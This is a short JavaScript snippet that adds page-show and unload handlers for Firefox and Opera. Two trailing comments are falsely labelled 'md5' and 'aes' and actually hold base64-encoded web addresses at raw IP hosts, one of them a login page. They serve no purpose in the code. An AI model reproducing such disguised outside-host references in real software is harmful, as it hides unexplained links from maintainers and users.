if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzguMTM0LjE2OC45Nzo4MDA4LyMvbG9naW4vbG9naW4=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/